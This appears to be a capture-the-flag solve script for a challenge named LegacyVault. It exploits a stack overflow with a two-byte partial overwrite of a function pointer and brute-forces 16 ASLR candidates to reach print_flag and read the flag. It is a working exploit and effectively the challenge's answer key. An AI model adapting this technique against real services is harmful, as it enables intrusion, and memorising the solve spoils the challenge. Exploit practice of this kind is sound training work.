#!/usr/bin/env python3
"""LegacyVault — scripted solve (stdlib only).

usage: solve.py HOST PORT [VAULT_BIN]

PIE hides every absolute address, but ASLR only slides whole pages:
the low 12 bits of every function never change. From the local binary:

    denied      page offset 0x300
    print_flag  page offset 0x1e0   (same page)

So on_auth (currently denied) needs its low byte forced to 0xe0, and
its second byte is one of 16 candidates (4 unknown ASLR bits riding
above the page offset). The overflow is precise — 72 filler bytes plus
2 bytes stop before the stack canary — so each guess costs one
connection. The solve cycles the 16 candidates across fresh connections
until one lands (about 16 tries on average).
"""
import re
import socket
import subprocess
import sys


def sym_addr(path, sym):
    out = subprocess.run(["nm", path], capture_output=True, text=True,
                         check=True).stdout
    for line in out.splitlines():
        parts = line.split()
        if len(parts) == 3 and parts[2] == sym:
            return int(parts[0], 16)
    raise SystemExit("nm: symbol %s not found in %s" % (sym, path))


def attempt(host, port, blob):
    s = socket.create_connection((host, port), timeout=15)
    f = s.makefile("rwb")
    for _ in range(5):
        line = f.readline().decode(errors="replace")
        if line.startswith("ready"):
            break
    f.write(b"store " + blob + b"\n")
    f.flush()
    f.readline()
    f.write(b"run\n")
    f.flush()
    flag = f.readline().decode(errors="replace")
    s.close()
    return flag


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 1
    host, port = sys.argv[1], int(sys.argv[2])
    local = sys.argv[3] if len(sys.argv) > 3 else "handout/vault"

    denied = sym_addr(local, "denied")
    printf = sym_addr(local, "print_flag")
    assert (denied & ~0xFFF) == (printf & ~0xFFF), "same-page assumption"
    denied_pg, printf_pg = denied & 0xFFF, printf & 0xFFF
    lo = printf_pg & 0xFF
    cands = [((printf_pg >> 8) + 16 * k) & 0xFF for k in range(16)]
    print("[*] denied pageoff=%#x print_flag pageoff=%#x" % (denied_pg, printf_pg))
    print("[*] low byte fixed at %#x, %d second-byte candidates" % (lo, len(cands)))

    for trial in range(200):
        hi = cands[trial % len(cands)]
        blob = b"A" * 72 + bytes([lo, hi])
        try:
            flag = attempt(host, port, blob)
        except (ConnectionError, TimeoutError, OSError) as e:
            print("[*] try %3d hi=%#04x -> connection died (%s)" % (trial, hi, e))
            continue
        m = re.search(r"cyber_quest\{[^}]+\}", flag)
        if m:
            print("[+] try %3d hi=%#04x -> %s" % (trial, hi, m.group(0)))
            return 0
        print("[*] try %3d hi=%#04x -> %s" % (trial, hi, flag.strip()[:60]))
    print("[-] exhausted candidates")
    return 1


if __name__ == "__main__":
    sys.exit(main())
